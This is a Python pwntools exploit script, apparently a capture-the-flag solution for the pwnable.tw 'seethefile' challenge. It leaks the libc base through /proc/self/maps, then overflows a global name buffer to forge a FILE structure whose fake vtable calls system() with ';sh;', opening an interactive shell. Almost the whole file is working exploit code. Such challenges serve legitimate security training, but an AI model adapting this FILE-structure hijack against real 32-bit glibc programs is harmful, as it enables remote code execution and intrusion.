from pwn import *

#p = process(["./ld-2.23.so","./seethefile"],env = {"LD_PRELOAD":"./libc-2.23.so"})
#libc = ELF("./libc-2.23.so")


#p = process(["./ld-2.23.so","./seethefile"],env = {"LD_PRELOAD":"./libc_32.so.6"})
p = remote("chall.pwnable.tw", 10200)
libc = ELF("./libc_32.so.6")
elf = ELF("./seethefile")

p.sendlineafter("choice :","1")
p.sendlineafter("see :","/proc/self/maps")
p.sendlineafter("choice :","2")
p.sendlineafter("choice :","3")

p.recvuntil("[heap]\n")

libc_base = int(p.recvuntil('-')[:-1],16)
libc_base = libc_base + 0x1000
#for local
#libc_base = (libc_base << 4) + 0x1000



print "[+] system offset : " + hex(libc.sym['system'])  
system = libc_base + libc.sym['system']
name = elf.sym['name']
fp = elf.sym['fp']
print "[+] libc_base : " + hex(libc_base)
print "[+] system : " + hex(system)
print "[+] name : " + hex(name)
print "[+] fp : " + hex(fp)


p.sendlineafter("choice :","5")
'''
cmp byte fd + 0x46,0
-> jz -> fclose GLIBC_2.1
-> jnz -> fclose GLIBC_2.0


fclose GLIBC_2.0
	test magic + flag,0x2000
	test magic + flag,0x8000
	cmp [[fd+0x48] + 8],something


vtable offset at 0x4c
''' 
payload = p32(0x80808040) + ';sh;' + 'A'*(fp-name-8) + p32(name) 
payload += (0x48-len(payload))*'C' + p32(name + 0x300)
payload += p32(name + 0x50)
payload += p32(system)*0x100 

#gdb.attach(p)
p.sendlineafter("name :",payload)

p.interactive()